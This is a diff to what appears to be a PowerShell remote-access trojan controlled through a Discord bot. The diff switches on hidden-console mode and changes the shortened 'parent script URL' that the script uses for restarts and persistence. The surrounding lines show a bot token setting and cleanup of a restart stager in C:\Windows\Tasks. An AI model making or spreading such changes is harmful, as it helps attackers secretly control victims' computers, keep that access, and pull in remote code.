@@ -21,11 +21,11 @@
 $global:token = "$tk" # make sure your bot is in ONE server only
 # =============================================================== SCRIPT SETUP =========================================================================
 
-$HideConsole = 0 # HIDE THE WINDOW - Change to 1 to hide the console window while running
+$HideConsole = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
 $spawnChannels = 1 # Create new channel on session start
 $InfoOnConnect = 1 # Generate client info message on session start
 $defaultstart = 1 # Option to start all jobs automatically upon running
-$global:parent = "https://is.gd/ir32M2" # parent script URL (for restarts and persistance)
+$global:parent = "https://is.gd/ir32M3" # parent script URL (for restarts and persistance)
 
 # remove restart stager (if present)
 if(Test-Path "C:\Windows\Tasks\service.vbs"){
